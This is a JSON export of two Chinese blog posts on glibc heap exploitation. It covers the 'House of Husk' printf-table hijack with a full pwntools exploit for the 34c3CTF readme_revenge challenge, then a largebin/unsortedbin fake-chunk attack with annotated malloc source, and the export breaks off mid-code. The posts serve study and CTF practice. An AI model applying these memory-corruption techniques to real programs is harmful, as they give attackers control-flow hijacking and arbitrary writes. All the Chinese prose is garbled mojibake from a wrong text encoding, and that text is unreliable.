[{"content":"æœ¬æ–‡å‚è€ƒäº†ä¸‹é¢ä¸¤ç¯‡æ–‡ç« \nhttps://xz.aliyun.com/news/14821\nhttps://zikh26.github.io/posts/6c83c2a2.html\nä»‹ç»:house of huskæ˜¯å¯¹printfå‡½æ•°å†…éƒ¨è¿›è¡Œæ³¨å†Œè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„æŒ‡é’ˆè¿›è¡ŒåŠ«æŒï¼Œglibc 2.23-2.35è¯¥æ‰‹æ³•å‡å¯ç”¨\nåŸç† æ‰§è¡Œprintfå‡½æ•°æ—¶ï¼Œ__printf_function_table æ˜¯å¦ä¸ºç©ºï¼Œæ¥åˆ¤æ–­æ˜¯å¦æœ‰è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚æœåˆ¤å®šä¸ºæœ‰çš„è¯ï¼Œåˆ™ä¼šå»æ‰§è¡Œ __printf_arginfo_table[spec] å¤„çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è¿™æœŸé—´å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•åœ°å€çš„åˆæ³•æ€§æ£€æŸ¥\né‚£æˆ‘ä»¬å¦‚æœåŠ«æŒ__printf_function_tableéç©ºï¼ŒåŠ«æŒ __printf_arginfo_table ä½¿å…¶è¡¨ä¸­å­˜æ”¾çš„ spec çš„ä½ç½®æ˜¯ backdoor()ï¼Œåœ¨æ‰§è¡Œprintfå‡½æ•°æ—¶å°±å¯ä»¥åŠ«æŒç¨‹åºæ‰§è¡Œæµåˆ°backdoor()\nåˆ©ç”¨æ–¹æ³• __printf_function_table å’Œ__printf_arginfo_table åˆ†åˆ«å†™ä¸º chunk A å’Œ chunk B çš„åœ°å€ è®¾å ä½ç¬¦ä¸º Î±ï¼Œæ­¤æ—¶ chunk B çš„å†…å®¹åº”è¯¥ä¸º p64(0) x ord(Î±-2) + p64(one_gadget) specæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚æœ€åè°ƒç”¨çš„æ˜¯printf(\u0026quot;%X\\n\u0026quot;,a)é‚£ä¹ˆåº”è¯¥å°†__printf_arginfo_table[88]çš„ä½ç½®å†™å…¥backdoor(),å…¶ä¸­88æ˜¯ord(\u0026lsquo;X\u0026rsquo;)\nè¯¥æŠ€å·§ä¸€èˆ¬å’Œ largebin attackæˆ–unsortedbin attack ç»“åˆèµ·æ¥ è¿˜å¯ä»¥ä½¿ç”¨relative overwrite è¿˜æœ‰ä¸€ä¸ª__printf_va_arg_table ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯æ¡ä»¶æ¯”è¾ƒè‹›åˆ» Relative overwrite 1é¦–å…ˆåˆ©ç”¨largebin attackæˆ–unsortedbin attackä¿®æ”¹gloabl_max_fast(å®šä¹‰äº† fastbin èƒ½å¤Ÿå¤„ç†çš„ chunk æœ€å¤§å¤§å°)\nfastbinsYæ•°ç»„ä½äºmain_areaä¸­ï¼Œå½“freeä¸€ä¸ªchunkæ—¶ï¼Œä¼šå‘fastbinsYæ•°ç»„ä¸­å†™å…¥åœ°å€\n2å¦‚æœä¿®æ”¹äº†gloabl_max_fastï¼Œé‡Šæ”¾æ˜¯ä¸ªå¤§chunkæ—¶å°±ä¼šé€ æˆæ•°ç»„è¶Šç•Œä»è€Œå‘ä¸¤ä¸ªtableä¸­å†™å…¥å †åœ°å€\næºç è§£æ é“¾æ¡ä¸ºä¸‹é¢äº”ä¸ªéƒ¨åˆ†\nprintf-\u0026gt;vfprintf\nvfprintf-\u0026gt;do_positional\ndo_positional-\u0026gt;printf_positional\nprintf_positional-\u0026gt;__parse_one_specmb(è¯¥å‡½æ•°æ‰§è¡Œè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆ)\n__parse_one_specmb-\u0026gt;anyaddr\n__register_printf_functionå‡½æ•° æ ¼å¼åŒ–å­—ç¬¦çš„æ³¨å†Œå‡½æ•°,å®é™…ä¸Šæ˜¯__register_printf_specifierå‡½æ•°çš„å°è£…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* Register FUNC to be called to format SPEC specifiers. */ int __register_printf_specifier (int spec, printf_function converter, printf_arginfo_size_function arginfo) { if (spec \u0026lt; 0 || spec \u0026gt; (int) UCHAR_MAX) #UCHAR_MAX=0xff { __set_errno (EINVAL); return -1; } int result = 0; __libc_lock_lock (lock); if (__printf_function_table == NULL) { __printf_arginfo_table = (printf_arginfo_size_function **) calloc (UCHAR_MAX + 1, sizeof (void *) * 2); if (__printf_arginfo_table == NULL) { result = -1; goto out; } __printf_function_table = (printf_function **) (__printf_arginfo_table + UCHAR_MAX + 1); } __printf_function_table[spec] = converter; __printf_arginfo_table[spec] = arginfo; out: __libc_lock_unlock (lock); return result; } å…ˆåšäº†ä¸€ä¸ªåˆ¤æ–­ åˆ¤æ–­specæ˜¯å¦å­˜åœ¨ascilç ï¼Œå†åˆ¤æ–­printf_function_table == NULL å°±è®¾å®šä¸€ä¸ªcallocæ¥åˆ†é…ä¸¤ä¸ªç´¢å¼•è¡¨ï¼Œå¹¶å°†åœ°å€å­˜æ”¾åˆ° __printf_function_tableå’Œ __printf_arginfo_tableä¸­ï¼Œä¸¤ä¸ªè¡¨å¤§å°éƒ½æ˜¯0x100å¯ä»¥ç»™0x0-0xffæ¯ä¸ªå­—ç¬¦æ³¨å†Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ\nprintf-\u0026gt;vfprintf 1 2 3 4 5 6 7 8 9 10 11 12 int __printf (const char *format, ...) { va_list arg; int done; va_start (arg, format); done = vfprintf (stdout, format, arg); va_end (arg); return done; } vfprintf-\u0026gt;do_positional 1 2 3 4 5 /* Use the slow path in case any printf handler is registered. */ if (__glibc_unlikely (__printf_function_table != NULL || __printf_modifier_table != NULL || __printf_va_arg_table != NULL)) goto do_positional; è¿™é‡Œæ£€æŸ¥ä¸‰ä¸ªtableï¼Œåªè¦æœ‰ä¸€ä¸ªéç©ºå°±æ‰§è¡Œdo_positional\né€šå¸¸åŠ«æŒçš„æ˜¯__printf_function_table\ndo_positional-\u0026gt;printf_positional 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 if (__glibc_unlikely (__printf_function_table != NULL || __printf_modifier_table != NULL || __printf_va_arg_table != NULL)) goto do_positional; ...... do_positional: if (__glibc_unlikely (workstart != NULL)) { free (workstart); workstart = NULL; } done = printf_positional (s, format, readonly_format, ap, \u0026amp;ap_save, done, nspecs_done, lead_str_end, work_buffer, save_errno, grouping, thousands_sep); è°ƒç”¨äº†printf_positionalå‡½æ•°\nprintf_positional-\u0026gt;__parse_one_specmb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 printf_positional (_IO_FILE *s, const CHAR_T *format, int readonly_format, va_list ap, va_list *ap_savep, int done, int nspecs_done, const UCHAR_T *lead_str_end, CHAR_T *work_buffer, int save_errno, const char *grouping, THOUSANDS_SEP_T thousands_sep) { --------------------------------------- /* Parse the format specifier. */ #ifdef COMPILE_WPRINTF nargs += __parse_one_specwc (f, nargs, \u0026amp;specs[nspecs], \u0026amp;max_ref_arg); #else nargs += __parse_one_specmb (f, nargs, \u0026amp;specs[nspecs], \u0026amp;max_ref_arg); #endif//è°ƒç”¨__parse_one_specmb } /* Determine the number of arguments the format string consumes. */ nargs = MAX (nargs, max_ref_arg); __parse_one_specmb-\u0026gt;anyaddr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #ifdef COMPILE_WPRINTF __parse_one_specwc (const UCHAR_T *format, size_t posn, struct printf_spec *spec, size_t *max_ref_arg) #else __parse_one_specmb (const UCHAR_T *format, size_t posn, struct printf_spec *spec, size_t *max_ref_arg) #endif { unsigned int n; size_t nargs = 0; /* Skip the \u0026#39;%\u0026#39;. */ ++format; -----------------------------------å…³é”®ä»£ç  if (__builtin_expect (__printf_modifier_table == NULL, 1) || __printf_modifier_table[*format] == NULL || HANDLE_REGISTERED_MODIFIER (\u0026amp;format, \u0026amp;spec-\u0026gt;info) != 0) ... if (__builtin_expect (__printf_function_table == NULL, 1) || spec-\u0026gt;info.spec \u0026gt; UCHAR_MAX || __printf_arginfo_table[spec-\u0026gt;info.spec] == NULL /* We don\u0026#39;t try to get the types for all arguments if the format uses more than one. The normal case is covered though. If the call returns -1 we continue with the normal specifiers. */ || (int) (spec-\u0026gt;ndata_args = (*__printf_arginfo_table[spec-\u0026gt;info.spec]) (\u0026amp;spec-\u0026gt;info, 1, \u0026amp;spec-\u0026gt;data_arg_type, \u0026amp;spec-\u0026gt;size)) \u0026lt; 0) 34c3CTF readme_revenge 1 2 3 4 5 6 7 8 9 10 11 int __fastcall main(int argc, const char **argv, const char **envp) { int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d _isoc99_scanf((unsigned int)\u0026amp;I010s, (unsigned int)\u0026amp;name, (_DWORD)envp); printf((unsigned int)\u0026#34;Hi, %s. Bye.\\n\u0026#34;, (unsigned int)\u0026amp;name, v3, v4, v5, v6); return 0; } ç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œflagç›´æ¥å‚¨å­˜åœ¨dataæ®µ,ä¸”house_of_huskç›¸å…³çš„ä¿©ä¸ªtableåœ°å€å‡æ¯”nameé«˜ï¼Œå¯ä»¥ä¿®æ”¹__printf_function_tableéç©ºï¼Œ__printf_arginfo_tableä¸ºä»»æ„åœ°å€Aæ»¡è¶³*(A+8*0x73)=_stack_chk_fail_localåœ°å€\næœ€åæŠŠ__libc_argv[0]åœ°å€æ”¹ä¸ºflagåœ°å€\n1 2 è°ƒç”¨_stack_chk_fail_localæ—¶ ä¼šæ‰“å°å‡º __libc_argv[0] æŒ‡å‘çš„å­—ç¬¦ä¸² è¯¥é¢˜ä¸­ __libc_argv[0]åœ°å€ä¹Ÿæ¯”nameé«˜ åªä¿®æ”¹ä¸Šè¿°ä¸¤ä¸ªtableä¼šè§¦å‘__parse_one_specmbä¸­çš„ä¸‹é¢ä»£ç \n1 2 3 if (__builtin_expect (__printf_modifier_table == NULL, 1) || __printf_modifier_table[*format] == NULL || HANDLE_REGISTERED_MODIFIER (\u0026amp;format, \u0026amp;spec-\u0026gt;info) != 0) éœ€è¦æ§åˆ¶__printf_modifier_tableä¸ºç©ºï¼Œ__printf_modifier_tableåœ°å€ä¸º__printf_function_tableåœ°å€+8\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import* context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p=process(\u0026#39;./pwn\u0026#39;) #%s is 0x73 arg_table=0x6b7aa8 #distance fun_table 0x80 fun_table=0x6b7a28#distance 0x648 name=0x6B73E0 flag=0x6b4040 #__printf_modifier_table ä½äº __printf_function_table åœ°å€åŠ  8 çš„ä½ç½® libc_argv=0x6b7980 #distance 0x5a0 #__stack_chk_fail_local leak=0x4359B0 pay=p64(flag)+b\u0026#39;a\u0026#39;*0x598 pay+=p64(name)#libc_argv[0] pay+=b\u0026#39;a\u0026#39;*(0x648-0x5a0-8)+p64(0xdeadbeef)#fun_table pay+=p64(0)#__printf_modifier_table pay+=b\u0026#39;a\u0026#39;*0x70 pay+=p64(arg_table) pay+=p64(0)*0x72+p64(leak) gdb.attach(p,\u0026#39;b *0x400A5C\u0026#39;) p.sendline(pay) p.interactive() ","date":"2026-02-15T00:43:28+08:00","image":"http://localhost:1313/image/husk/House_of_husk.jpg","permalink":"http://localhost:1313/p/house-of-husk34c3ctf-readme_revenge/","title":"House of husk\u0026\u002634c3CTF readme_revenge"},{"content":"https://www.cnblogs.com/Rookle/p/13140339.html\nä½œç”¨ï¼šä»»æ„åœ°å€åˆ†é…chunk\nåˆ©ç”¨æ¡ä»¶ï¼š\n1 glibc\u0026lt;2.30\n2 èƒ½å¤Ÿåœ¨largebinå’Œunsortedbinä¸­åˆ†åˆ«å¸ƒç½®ä¸€ä¸ªchunkä¸”unsortedbinä¸­çš„è¾ƒå¤§(ä½†è¦å’Œlargebinä¸­çš„chunkå¤§å°åœ¨åŒä¸€èŒƒå›´)\n3 unsortedbin chunkçš„bkå¯æ§(unsortedbin attack)\n4 largebin chunkçš„bkå’Œbk_nextsizeå¯æ§(largebin attack)\næºç åˆ†æ æ¼æ´å‘ç”Ÿåœ¨unsorted_binçš„chunkæ”¾å…¥largebinçš„è¿‡ç¨‹ä¸­ï¼Œä»¥ä¸‹æ˜¯glibc2.23çš„æºç åˆ†æ\nå…³é”®ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 victim = unsorted_chunks (av)-\u0026gt;bk bck = victim-\u0026gt;bk unsorted_chunks (av)-\u0026gt;bk = bck bck-\u0026gt;fd = unsorted_chunks (av) --------------------------------------------------------- //ä¸‹ç§°æˆ‘ä»¬åœ¨unsortedbinä¸­å¸ƒç½®çš„chunkä¸ºunsorted_chunk //æˆ‘ä»¬æ§åˆ¶unsorted_chunk-\u0026gt;bk = fake_chunk //unsorted_chunks(av)-\u0026gt;bk = fake_chunk unsorted_chunks(av)-\u0026gt;bk = unsorted_chunk-\u0026gt;bk; //fake_chunk+0x10 = unsorted_bin bck-\u0026gt;fd = unsorted_chunks(av); //è¿™é‡Œå°†fake_chunkçš„fdæ”¹ä¸ºäº†mainarea+88 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 //æˆ‘ä»¬åœ¨largebinä¸­å¸ƒç½®çš„chunkç§°ä½œlarge_chunk else { /* å¦‚æœunsorted_chunk-\u0026gt;size å¤§äº largbin_chunk-\u0026gt;sizeï¼Œ æŠŠunsorted_chunkåŠ å…¥åˆ°çºµå‘é“¾è¡¨ä¸­ æˆ‘ä»¬æ§åˆ¶ large_chunk-\u0026gt;bk = fake_chunk+0x8 large_chunk-\u0026gt;bk_nextsize=fake_chunk-0x18-5\t-------------------------------------- { åŸä»£ç  victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; --------------------------------------- } bck = fwd-\u0026gt;bk; */ unsorted_chunk-\u0026gt;fd_nextsize = largbin_chunk; //unsorted_chunk-\u0026gt;bk_nextsize = fake_chunk-0x18-5 unsorted_chunk-\u0026gt;bk_nextsize = largbin_chunk-\u0026gt;bk_nextsize; largbin_chunk-\u0026gt;bk_nextsize = unsorted_chunk; //fake_chunk+0x3 = unsorted_chunk unsorted_chunk-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = unsorted_chunk; //è¿™é‡Œè®¾ç½®å¥½äº†äº†fake_chunkçš„size } //bck = fake_chunk+0x8(ä¸ºä¸‹é¢è®¾ç½®fake_chunkçš„bkåšå‡†å¤‡) bck = largbin_chunk-\u0026gt;bk; } } mark_bin(av, unsorted_chunk_index); //æŠŠunsorted_chunkåŠ å…¥åˆ°çš„binçš„è¡¨ç¤ºä¸ºéç©º //æŠŠunsorted_chunkåŠ å…¥åˆ°large binçš„é“¾è¡¨ä¸­ /* victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; */ unsorted_chunk-\u0026gt;bk = bck; unsorted_chunk-\u0026gt;fd = largbin_chunk; largbin_chunk-\u0026gt;bk = unsorted_chunk; //fake_chunk+0x18 = unsorted_chunk bck-\u0026gt;fd = unsorted_chunk; ä¸»è¦æ”¹å†™å°±ä»¥ä¸‹4ä¸ªåœ°æ–¹\nunsorted_bin-\u0026gt;bk = fake_chunk #æŠŠfake_chunké“¾åˆ°äº†unsorted_binä¸­ fake_chunk+0x10 = unsorted_bin #ä¼ªé€ fake_chunkçš„fd fake_chunk+0x3 = unsorted_chunk #ä¼ªé€ fake_chunkçš„size fake_chunk+0x18 = unsorted_chunk #ä¼ªé€ fake_chunkçš„bk é€šè¿‡ä»¥ä¸Š4æ­¥ï¼Œæˆ‘ä»¬æˆåŠŸä¼ªé€ ä¸€ä¸ªåˆæ³•çš„fake_chunkï¼Œæ»¡è¶³unsorted binçš„è¦æ±‚ï¼Œå¹¶æŠŠå®ƒé“¾åˆ°äº†unsorted binä¸­\nå…³äºfake_chunk_sizeï¼šæˆ‘ä»¬åœ¨fake_chunk+0x3ä½ç½®å†™å…¥äº†ä¸€ä¸ªå †åœ°å€ï¼Œè¯¥åœ°å€çš„é«˜å­—èŠ‚ä¼šæˆä¸ºfake_chunkçš„size,å¼€å¯ALSRçš„64ä½ç¨‹åºå †åœ°å€ä¸€èˆ¬æ˜¯0x57ã€0x56æˆ–0x55å¼€å¤´ï¼Œè¿™ä¸‰ä¸ªä¸ªæ•°ä½œä¸ºchunk_sizeï¼Œå»æ‰æ ‡å¿—ä½ä¹‹åéƒ½æ˜¯0x50,ä½†æ˜¯__int_mallocåœ¨æ‹¿åˆ°chunkåè¿”å›åˆ°__libc_mallocï¼Œ__libc_mallocä¼šå¯¹chunkçš„è¿›è¡Œæ£€æŸ¥,è¦æ±‚Mä½ç­‰äº1ï¼Œ0x55ä¸ç¬¦åˆæ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯èƒ½è¦å¤šè¿è¡Œå‡ æ¬¡\n1 2 3 4 5 6 7 8 9 10 11 /* #define arena_for_chunk(ptr) \\ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-\u0026gt;ar_ptr : \u0026amp;main_arena) è¿‡ä»¥ä¸‹æ£€æµ‹éœ€è¦æ»¡è¶³çš„è¦æ±‚ï¼Œåªéœ€æ»¡è¶³ä¸€æ¡å³å¯ 1. victim ä¸º 0 2. IS_MMAPPED ä¸º 1 3. NON_MAIN_ARENA ä¸º 0 */ assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim))); å®Œæ•´ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 //#define unsorted_chunks(M) (bin_at (M, 1)) //å¦‚æœunsorted binsä¸ä¸ºç©ºï¼Œä»å°¾åˆ°å¤´éå†unsorted binä¸­çš„æ¯ä¸ªchunk while ((victim = unsorted_chunks(av)-\u0026gt;bk) != unsorted_chunks(av)) { bck = victim-\u0026gt;bk;//å–å‡ºunsortedçš„å°¾éƒ¨çš„chunk /* æ£€æŸ¥å½“å‰éå†çš„ chunk æ˜¯å¦åˆæ³•ï¼Œchunk çš„å¤§å°ä¸èƒ½å°äºç­‰äº 2 * SIZE_SZï¼Œ ä¹Ÿä¸èƒ½è¶…è¿‡ è¯¥åˆ†é…åŒºæ€»çš„å†…å­˜åˆ†é…é‡ã€‚ç„¶åè·å– chunk çš„å¤§å°å¹¶èµ‹å€¼ç»™ sizeã€‚ è¿™é‡Œçš„æ£€æŸ¥ä¼¼ä¹æœ‰ç‚¹å°é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨äº† victim-\u0026gt;sizeï¼Œä½† victim-\u0026gt;size ä¸­åŒ…å«äº†ç›¸å…³çš„æ ‡å¿—ä½ä¿¡æ¯ï¼Œä½¿ç”¨ chunksize(victim) æ‰æ¯”è¾ƒåˆç†ï¼Œä½†åœ¨ unsorted bin ä¸­çš„ç©ºé—² chunk çš„æ‰€æœ‰æ ‡å¿—ä½éƒ½æ¸…é›¶äº†ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ victim-\u0026gt;size æ²¡æœ‰é—®é¢˜ã€‚ */ if (__builtin_expect(victim-\u0026gt;size \u0026lt;= 2 * SIZE_SZ, 0) || __builtin_expect(victim-\u0026gt;size \u0026gt; av-\u0026gt;system_mem, 0)) malloc_printerr(check_action, \u0026#34;malloc(): memory corruption\u0026#34;, chunk2mem(victim), av); size = chunksize(victim);//è·å–victimçš„size /* å¦‚æœè¦ç”³è¯·çš„å¤§å°åœ¨smallbinèŒƒå›´ ä¸” unsorted chunks åªæœ‰ä¸€ä¸ªchunkï¼Œä¸” victimæ˜¯last_remainder ä¸” victimçš„sizeå¤§äºè¯·æ±‚çš„chunkçš„å¤§å°nbåŠ ä¸Š (MINSIZE)æœ€å°chunkçš„size,é‚£ä¹ˆå°±åˆ‡å‰²remainder,ç„¶åè¿”å›victimã€‚ last_remainder æ˜¯ä¸€ä¸ª chunk æŒ‡é’ˆï¼Œåˆ†é…åŒºä¸Šæ¬¡åˆ†é… small chunk æ—¶ï¼Œ ä»ä¸€ä¸ª chunk ä¸­åˆ† è£‚å‡ºä¸€ä¸ª small chunk è¿”å›ç»™ç”¨æˆ·ï¼Œåˆ†è£‚åçš„å‰©ä½™éƒ¨åˆ† å½¢æˆä¸€ä¸ª chunkï¼Œlast_remainder å°±æ˜¯ æŒ‡å‘çš„è¿™ä¸ª chunkã€‚ */ if (in_smallbin_range(nb) \u0026amp;\u0026amp; bck == unsorted_chunks(av) \u0026amp;\u0026amp; victim == av-\u0026gt;last_remainder \u0026amp;\u0026amp; (unsigned long) (size) \u0026gt; (unsigned long) (nb + MINSIZE)) { //åˆ†å‰²remainder remainder_size = size - nb;//è®¡ç®—åˆ†å‰²åå‰©ä¸‹çš„size remainder = chunk_at_offset(victim, nb);//è·å–remainderçš„åœ°å€ //æŠŠremainderåŠ å…¥unsorted binä¸­ unsorted_chunks(av)-\u0026gt;bk = unsorted_chunks(av)-\u0026gt;fd = remainder; av-\u0026gt;last_remainder = remainder; // è®¾ç½®last_remainderä¸ºremainder remainder-\u0026gt;bk = remainder-\u0026gt;fd = unsorted_chunks(av); //å¦‚æœæ˜¯remainderåœ¨large binçš„èŒƒå›´ï¼Œåˆ™æŠŠfd_nextsize,fd_nextsizeæ¸…é›¶ if (!in_smallbin_range(remainder_size)) { remainder-\u0026gt;fd_nextsize = NULL; remainder-\u0026gt;fd_nextsize = NULL; } //è®¾ç½®victimçš„size set_head(victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); //è®¾ç½®remainderçš„size set_head(remainder, remainder_size | PREV_INUSE); //è®¾ç½®remainderçš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkçš„prev_size set_foot(remainder, remainder_size); check_malloced_chunk(av, victim, nb);//é»˜è®¤ä¸åšä»»ä½•æ“ä½œ void *p = chunk2mem(victim);//å°†chunkæŒ‡é’ˆè½¬åŒ–ä¸ºmemæŒ‡é’ˆ alloc_perturb(p, bytes);//å°†pçš„meméƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸ºbytes ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš return p; } //æŠŠvictimä»unsorted bin ä¸­ç§»é™¤ unsorted_chunks(av)-\u0026gt;bk = bck; bck-\u0026gt;fd = unsorted_chunks(av); //å¦‚æœ victim çš„size ä¸ç”³è¯·çš„sizeç›¸ç­‰ï¼Œé‚£ä¹ˆå°±è¿”å›å…¶ã€‚ if (size == nb) { //è®¾ç½®victimç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkçš„prev_inuseä½ set_inuse_bit_at_offset(victim, size); //å¦‚æœavä¸æ˜¯main_arena ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸æ˜¯ä¸»è¿›ç¨‹,è®¾ç½®NON_MAIN_ARENAä½ if (av != \u0026amp;main_arena) victim-\u0026gt;size |= NON_MAIN_ARENA; check_malloced_chunk(av, victim, nb); // é»˜è®¤ä¸åšä»»ä½•æ“ä½œ void *p = chunk2mem(victim);//æŠŠchunkè½¬æ¢ä¸ºmemæŒ‡é’ˆ alloc_perturb(p, bytes);//å°†pçš„meméƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸ºbytes ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš return p; } //å¦‚æœä¸Šä¸€æ­¥å–å‡ºçš„chunkæ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œé‚£ä¹ˆå°†è¯¥chunkæ”¾å…¥å¯¹åº”çš„binä¸­ //å¦‚æœåœ¨smallbinçš„èŒƒå›´,åˆ™æ”¾åˆ°å¯¹åº”å¤šsmall binä¸­ if (in_smallbin_range(size)) { victim_index = smallbin_index(size);//è·å–sizeå¯¹åº”çš„smallbinçš„index bck = bin_at(av, victim_index);//bckæŒ‡å‘sizeå¯¹åº”çš„smallbinçš„é“¾è¡¨å¤´ //fwdæŒ‡å‘sizeå¯¹åº”çš„smallbinçš„é“¾è¡¨ä¸­çš„æ–°åŠ å…¥çš„chunk(small binä½¿ç”¨å¤´æ’æ³•) fwd = bck-\u0026gt;fd; } else//å¦‚æœä¸å†smallbinçš„èŒƒå›´ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨large bin çš„èŒƒå›´ { victim_index = largebin_index(size);//è·å–sizeå¯¹åº”çš„large binçš„index bck = bin_at(av, victim_index);//bckæŒ‡å‘sizeå¯¹åº”çš„large binçš„é“¾è¡¨å¤´ fwd = bck-\u0026gt;fd;//fwdæŒ‡å‘sizeå¯¹åº”çš„large binçš„é“¾è¡¨ä¸­çš„æ–°åŠ å…¥çš„chunk //å¦‚æœlarge bin éç©ºï¼Œåœ¨largbinè¿›è¡ŒæŒ‰é¡ºåºæ’å…¥ if (fwd != bck) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; assert((bck-\u0026gt;bk-\u0026gt;size \u0026amp; NON_MAIN_ARENA) == 0);//é»˜è®¤ä¸å¯ç”¨assert /* large binä¸­çš„chunkæ˜¯æŒ‰ä»å¤§åˆ°å°æ’åˆ—çš„ï¼Œå¦‚æœsize \u0026lt; large bin çš„æœ€åä¸€ä¸ªchunkï¼Œè¯´æ˜sizeæ˜¯è¿™ä¸ªlarge binä¸­çš„æœ€å°çš„ï¼Œæˆ‘ä»¬æŠŠå®ƒ åŠ å…¥åˆ°æ­¤large binå°¾éƒ¨ã€‚ */ if ((unsigned long) (size) \u0026lt; (unsigned long) (bck-\u0026gt;bk-\u0026gt;size)) { fwd = bck; bck = bck-\u0026gt;bk; /* large bin ä¸­sizeæœ€å°çš„chunkçš„fd_nextsizeä¼šæŒ‡å‘sizeæœ€å¤§çš„ é‚£ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯é¦–éƒ¨çš„chunkã€‚åŒæ ·ï¼Œlarge bin ä¸­sizeæœ€å¤§çš„ chunkçš„bk_nextsizeä¼šæŒ‡å‘sizeæœ€å°çš„é‚£ä¸ªchunkã€‚ victimçš„bk_nextsizeæŒ‡å‘large binåŸæ¥æœ€å°çš„chunkï¼Œå®ƒçš„ bk_nextsizeæŒ‡å‘æœ€å¤§çš„é‚£ä¸ªchunkã€‚é‚£ä¹ˆåŸæ¥çš„æœ€å°çš„å°±æˆäº†ç¬¬äºŒå°çš„äº†ã€‚ æŠŠå®ƒfd_nextsizeå’Œbk_nextsizeéƒ½ä¿®æ­£ã€‚ */ victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; //æœ€å¤§sizeçš„chunkçš„bk_nextsizeï¼Œå’ŒåŸæ¥æœ€å°chunkçš„bk_nextsizeéƒ½æŒ‡å‘victim fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } else //å¦‚æœvictimä¸æ˜¯large bin ä¸­æœ€å°çš„chunk { assert((fwd-\u0026gt;size \u0026amp; NON_MAIN_ARENA) == 0);//é»˜è®¤ä¸å¯ç”¨assert //ä»å¤§åˆ°å°ï¼ˆä»å¤´åˆ°å°¾ï¼‰æ‰¾åˆ°åˆé€‚çš„ä½ç½® while ((unsigned long) size \u0026lt; fwd-\u0026gt;size) { fwd = fwd-\u0026gt;fd_nextsize; assert((fwd-\u0026gt;size \u0026amp; NON_MAIN_ARENA) == 0); } //å¦‚æœsizeåˆšå¥½ç›¸ç­‰ï¼Œå°±ç›´æ¥åŠ å…¥åˆ°å…¶åé¢çœçš„æ”¹fd_nextsizeå’Œbk_nextsizeäº† if ((unsigned long) size == (unsigned long) fwd-\u0026gt;size) fwd = fwd-\u0026gt;fd; else { //sizeä¸ç›¸ç­‰ï¼Œå³size\u0026gt;fwd-\u0026gt;sizeï¼ŒæŠŠvictimåŠ å…¥åˆ°çºµå‘é“¾è¡¨ä¸­ victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } bck = fwd-\u0026gt;bk; } } else //å¦‚æœlarge bin ä¸ºç©ºï¼Œå°†victimåŠ å…¥åˆ°çºµå‘åˆ—è¡¨ victim-\u0026gt;fd_nextsize = 